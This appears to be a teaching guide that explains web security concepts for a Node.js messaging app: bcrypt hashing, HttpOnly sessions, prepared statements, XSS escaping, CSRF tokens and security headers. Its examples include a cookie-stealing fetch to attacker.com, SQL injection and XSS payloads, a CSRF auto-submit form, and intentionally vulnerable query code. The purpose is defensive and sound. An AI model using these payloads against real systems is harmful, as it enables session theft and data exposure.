# Security Concepts Guide for Students

## Overview
This document provides detailed explanations of the security concepts implemented in this application. Each concept is explained with both theory and practical examples from the codebase.

---

## 1. Password Security

### Why Never Store Plaintext Passwords?

**Problem:** If your database is compromised, all user passwords are exposed.

**Solution:** Password hashing with bcrypt

### How Bcrypt Works

```javascript
// When a user registers:
const password = "mySecretPassword123";
const hash = await bcrypt.hash(password, 12);
// Stored in DB: "$2b$12$abc123...XYZ789"

// When a user logs in:
const inputPassword = "mySecretPassword123";
const storedHash = "$2b$12$abc123...XYZ789";
const isValid = await bcrypt.compare(inputPassword, storedHash);
// Returns: true
```

### Key Features of Bcrypt:

1. **One-way function**: Cannot reverse the hash to get the password
2. **Unique salts**: Each password has a unique salt (prevents rainbow tables)
3. **Cost factor**: The "12" makes it computationally expensive (slows brute force)
4. **Adaptive**: Can increase cost factor as computers get faster

### Exercise:
```javascript
// Try this in the Node.js console:
const bcrypt = require('bcrypt');
const password = "test123";

// Hash the same password twice:
bcrypt.hash(password, 12).then(console.log);
bcrypt.hash(password, 12).then(console.log);

// Notice: Different hashes each time! (Due to unique salts)
```

---

## 2. Session-Based Authentication

### How It Works:

```
1. User logs in with valid credentials
   ↓
2. Server creates a session ID
   ↓
3. Session ID stored in cookie (HttpOnly)
   ↓
4. Browser sends cookie with each request
   ↓
5. Server verifies session ID
   ↓
6. User is authenticated
```

### Session Configuration in Code:

```javascript
app.use(session({
  secret: 'your-secret-key',      // Signs the session ID
  resave: false,                   // Don't save unchanged sessions
  saveUninitialized: false,        // Don't create sessions until needed
  cookie: {
    secure: false,                 // Set true with HTTPS
    httpOnly: true,                // Prevents JavaScript access
    maxAge: 1000 * 60 * 60 * 24   // 24 hours
  }
}));
```

### Why HttpOnly Cookies?

**Without HttpOnly:**
```javascript
// Malicious script can steal session:
const sessionId = document.cookie;
fetch('https://attacker.com/steal?cookie=' + sessionId);
```

**With HttpOnly:**
```javascript
// JavaScript cannot access the cookie
console.log(document.cookie); // Session cookie not visible!
```

---

## 3. SQL Injection Prevention

### The Vulnerability:

```javascript
// DANGEROUS CODE (Never do this!):
const email = req.body.email;
const query = `SELECT * FROM users WHERE email = '${email}'`;
db.exec(query);

// Attacker submits: ' OR '1'='1
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1'
// Result: Returns ALL users!
```

### The Solution: Prepared Statements

```javascript
// SAFE CODE:
const email = req.body.email;
const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email);

// The library handles escaping automatically
// No matter what the attacker submits, it's treated as data, not code
```

### How Prepared Statements Work:

1. Query structure is sent to database first
2. User data is sent separately
3. Database knows which parts are code vs data
4. Prevents injection entirely

---

## 4. Cross-Site Scripting (XSS) Prevention

### The Vulnerability:

```javascript
// User submits message: <script>alert('XSS!')</script>
// If displayed directly:
innerHTML = userMessage; // DANGEROUS!
// Browser executes the script!
```

### The Solution: Output Encoding

```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Input:  <script>alert('XSS')</script>
// Output: &lt;script&gt;alert('XSS')&lt;/script&gt;
// Browser displays as text, doesn't execute
```

### Real Example from Dashboard:

```javascript
// In dashboard.js:
container.innerHTML = inboxMessages.map(msg => `
    <div class="message-subject">${escapeHtml(msg.subject)}</div>
`).join('');

// Without escapeHtml:
// Subject: <img src=x onerror=alert('XSS')>
// Result: Script executes!

// With escapeHtml:
// Subject: &lt;img src=x onerror=alert('XSS')&gt;
// Result: Displays as text safely
```

---

## 5. Input Validation

### Defense in Depth: Validate Everywhere

```javascript
// Client-side validation (fast feedback):
<input type="email" required minlength="8">

// Server-side validation (security):
body('email').isEmail().normalizeEmail(),
body('password').isLength({ min: 8 })
```

### Why Both?

- **Client-side**: Better user experience, instant feedback
- **Server-side**: Security (client can be bypassed!)

### Validation Example:

```javascript
app.post('/api/register', [
  // Validation middleware
  body('email').isEmail().normalizeEmail(),
  body('password').isLength({ min: 8 })
], async (req, res) => {
  // Check for errors
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  
  // Proceed with registration
});
```

---

## 6. Security Headers with Helmet

### What Helmet Does:

```javascript
app.use(helmet());
// Adds multiple security headers automatically
```

### Important Headers:

1. **X-Frame-Options: DENY**
   - Prevents clickjacking attacks
   - Your site can't be embedded in an iframe

2. **X-Content-Type-Options: nosniff**
   - Prevents MIME sniffing
   - Browser must respect declared content type

3. **Content-Security-Policy**
   - Controls what resources can load
   - Prevents unauthorized scripts

4. **Strict-Transport-Security**
   - Forces HTTPS connections
   - Prevents downgrade attacks

### CSP Example:

```javascript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],           // Only load from same origin
    styleSrc: ["'self'", "'unsafe-inline'"],  // Allow inline styles
    scriptSrc: ["'self'"],            // Only scripts from same origin
  }
}
```

---

## 7. Cross-Site Request Forgery (CSRF)

### The Attack:

```html
<!-- Attacker's website: -->
<form action="https://yourapp.com/api/messages" method="POST">
  <input name="recipient_id" value="999">
  <input name="body" value="Send money!">
</form>
<script>document.forms[0].submit();</script>

<!-- If user is logged in to yourapp.com, this will work! -->
```

### The Solution: CSRF Tokens

```javascript
// Server generates unique token per session
const csrfProtection = csrf({ cookie: true });

// Token must be included in forms
<input type="hidden" name="_csrf" value="{{csrfToken}}">

// Server verifies token matches session
// Attacker can't get the token (same-origin policy)
```

---

## 8. Authentication vs Authorization

### Authentication: "Who are you?"

```javascript
// Verifying identity
const user = await verifyCredentials(email, password);
req.session.userId = user.id;
```

### Authorization: "What can you do?"

```javascript
// Checking permissions
const message = getMessage(messageId);
if (message.recipient_id !== req.session.userId) {
  return res.status(403).json({ error: 'Forbidden' });
}
```

### Example from Code:

```javascript
// Mark message as read
app.put('/api/messages/:id/read', requireAuth, (req, res) => {
  // Authentication: requireAuth middleware
  // Authorization: Check message belongs to user
  const message = db.prepare(
    'SELECT id FROM messages WHERE id = ? AND recipient_id = ?'
  ).get(messageId, req.session.userId);
  
  if (!message) {
    return res.status(404).json({ error: 'Message not found' });
  }
  // User is authorized to mark this message as read
});
```

---

## 9. Common Attack Vectors

### 1. Brute Force Attacks
**Attack**: Try many passwords until one works
**Defense**: Rate limiting (not implemented in basic version)

### 2. User Enumeration
**Attack**: Determine which emails are registered
**Defense**: Generic error messages

```javascript
// BAD:
if (!user) return res.json({ error: 'User not found' });
if (!validPassword) return res.json({ error: 'Wrong password' });

// GOOD:
if (!user || !validPassword) {
  return res.json({ error: 'Invalid credentials' });
}
```

### 3. Session Hijacking
**Attack**: Steal session cookie
**Defense**: HttpOnly cookies, HTTPS, secure flags

### 4. Man-in-the-Middle (MITM)
**Attack**: Intercept traffic between client and server
**Defense**: HTTPS/TLS encryption (use in production!)

---

## 10. Security Checklist

For students to verify:

- [ ] Passwords are hashed with bcrypt
- [ ] Sessions use HttpOnly cookies
- [ ] All inputs are validated server-side
- [ ] User output is escaped/encoded
- [ ] SQL uses prepared statements
- [ ] Security headers are present
- [ ] Authentication required for protected routes
- [ ] Authorization checks resource ownership
- [ ] Generic error messages (no user enumeration)
- [ ] HTTPS in production

---

## Additional Exercises

### Exercise 1: Test Password Hashing
```bash
# View database contents:
sqlite3 database.db
SELECT email, password_hash FROM users;
# Notice: No plaintext passwords!
```

### Exercise 2: Test Session Security
```javascript
// In browser console:
console.log(document.cookie);
// Notice: Session cookie might not be visible (HttpOnly)
```

### Exercise 3: Test SQL Injection (Safely)
Try logging in with:
- Email: `' OR '1'='1`
- Password: `anything`
- Should fail! (Prepared statements protect us)

### Exercise 4: Test XSS Prevention
Try sending a message with:
- Subject: `<script>alert('XSS')</script>`
- View in inbox
- Should display as text, not execute

---

## Resources for Further Learning

1. **OWASP Top 10**: Most critical web security risks
2. **OWASP Cheat Sheets**: Quick reference guides
3. **PortSwigger Web Security Academy**: Free training
4. **HackTheBox / CTF Challenges**: Practice security skills

---

Remember: **Security is not a feature you add; it's a mindset you adopt!**
